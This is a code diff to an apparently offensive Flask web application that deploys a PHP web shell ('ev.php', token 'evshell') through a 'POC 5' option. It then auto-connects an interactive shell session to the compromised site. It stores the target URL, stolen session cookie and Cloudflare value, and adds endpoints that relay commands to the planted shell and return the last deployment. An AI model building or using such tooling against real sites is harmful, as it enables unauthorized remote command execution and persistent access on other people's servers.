@@ -383,7 +383,13 @@ def build_stdin(tool_id, data):
         elif poc == "4":
             lines += [data.get("shell_url","/ev.php")]
         elif poc == "5":
-            lines += [data.get("shell_filename","ev.php"), "N", "exit"]
+            lines += [data.get("shell_filename","ev.php"), "N", "n"]
+            # Store deploy info so shell auto-connects
+            _shell_last_deploy["url"] = data.get("base_url","").rstrip("/")
+            _shell_last_deploy["token"] = data.get("token","evshell")
+            _shell_last_deploy["cookie"] = data.get("session","")
+            _shell_last_deploy["cf"] = data.get("cf","")
+            _shell_last_deploy["path"] = "/" + data.get("shell_filename","ev.php").lstrip("/")
         lines.append("0")  # exit menu
         return "\n".join(lines) + "\n"
 
@@ -671,15 +677,16 @@ def kill_tool(tool_id):
 # ── shell session (EXECVEIL interactive) ─────────────────────────────────────
 
 _shell = {}
+_shell_last_deploy = {}
 
 @app.route("/api/shell/connect", methods=["POST"])
 def shell_connect():
     body = request.get_json() or {}
-    _shell["url"]     = body.get("url","").rstrip("/")
+    _shell["url"]     = body.get("url","").rstrip("/") or _shell_last_deploy.get("url","")
     _shell["path"]    = body.get("path", "/ev.php")
-    _shell["token"]   = body.get("token","evshell")
-    _shell["cookie"]  = body.get("cookie","")
-    _shell["cf"]      = body.get("cf","")
+    _shell["token"]   = body.get("token","evshell") or _shell_last_deploy.get("token","evshell")
+    _shell["cookie"]  = body.get("cookie","") or _shell_last_deploy.get("cookie","")
+    _shell["cf"]      = body.get("cf","") or _shell_last_deploy.get("cf","")
     return jsonify({"connected": True, "endpoint": _shell["url"] + _shell["path"]})
 
 @app.route("/api/shell/exec", methods=["POST"])
@@ -703,11 +710,16 @@ def shell_exec():
             buf += chunk
         try:
             d = json.loads(buf)
-            return jsonify({"out": d.get("out",""), "code": d.get("code",0)})
+            return jsonify({"out": d.get("out",""), "code": d.get("code",0), "method": d.get("method","")})
         except Exception:
             return jsonify({"out": buf, "code": r.status_code})
     except Exception as e:
         return jsonify({"out": str(e), "code": -1, "error": True})
+
+@app.route("/api/shell/last-deploy", methods=["GET"])
+def shell_last_deploy():
+    """Return info from the last POC 5 deploy so frontend can auto-connect."""
+    return jsonify(_shell_last_deploy)
 
 # ── AUTOSCAN API (structured JSON result) ─────────────────────────────────────
 
